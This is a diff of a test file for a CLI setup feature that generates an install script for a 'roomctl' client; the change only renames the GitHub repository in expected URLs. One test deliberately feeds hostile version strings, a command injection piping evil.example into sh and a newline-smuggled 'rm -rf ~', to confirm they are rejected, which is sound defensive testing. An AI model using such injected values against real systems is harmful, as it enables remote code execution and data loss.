@@ -131,7 +131,7 @@ describe("cliSetup", () => {
     const { get, text } = await open({ ...values, version: "v0.7.0" });
     expect(text).toBe([
       `os=$(uname -s | tr A-Z a-z); arch=$(uname -m); case $arch in x86_64) arch=amd64;; aarch64) arch=arm64;; esac`,
-      `base=https://github.com/Smana/agent-platform/releases/download/v0.7.0`,
+      `base=https://github.com/Smana/maku/releases/download/v0.7.0`,
       `curl -fsSLO "$base/roomctl-$os-$arch" && curl -fsSLO "$base/roomctl.sha256"`,
       `command -v sha256sum >/dev/null && sum=sha256sum || sum="shasum -a 256"`,
       `grep " roomctl-$os-$arch$" roomctl.sha256 | $sum -c - && sudo install -m 0755 "roomctl-$os-$arch" /usr/local/bin/roomctl`,
@@ -147,7 +147,7 @@ describe("cliSetup", () => {
   it("installs the latest release when the version is not a whole release semver, hostile ones included", async () => {
     for (const version of ["dev", undefined, `v1"; curl https://evil.example | sh #`, "v1.2.3\nrm -rf ~"]) {
       const { text } = await open({ ...values, version });
-      expect(text).toContain("base=https://github.com/Smana/agent-platform/releases/latest/download\n");
+      expect(text).toContain("base=https://github.com/Smana/maku/releases/latest/download\n");
     }
   });
   it("says so when this broker has no roomctl client", async () => {
